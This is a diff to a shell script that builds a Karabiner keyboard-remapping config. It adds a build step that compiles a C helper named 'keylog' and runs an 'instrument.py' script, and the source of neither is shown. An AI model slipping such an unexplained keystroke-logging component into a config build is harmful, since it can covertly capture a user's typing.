@@ -25,3 +25,9 @@ jq '.profiles[0].complex_modifications.rules = [inputs]' \
 rule_count=$(jq '.profiles[0].complex_modifications.rules | length' "$OUTPUT")
 manip_count=$(jq '[.profiles[0].complex_modifications.rules[].manipulators | length] | add' "$OUTPUT")
 echo "Built karabiner.json: $rule_count rules, $manip_count manipulators"
+
+HELPER="$SCRIPT_DIR/helper/keylog"
+if [ ! -x "$HELPER" ] || [ "$HELPER.c" -nt "$HELPER" ]; then
+    cc -O2 -Wall -o "$HELPER" "$HELPER.c"
+fi
+python3 "$SCRIPT_DIR/instrument.py" "$OUTPUT"
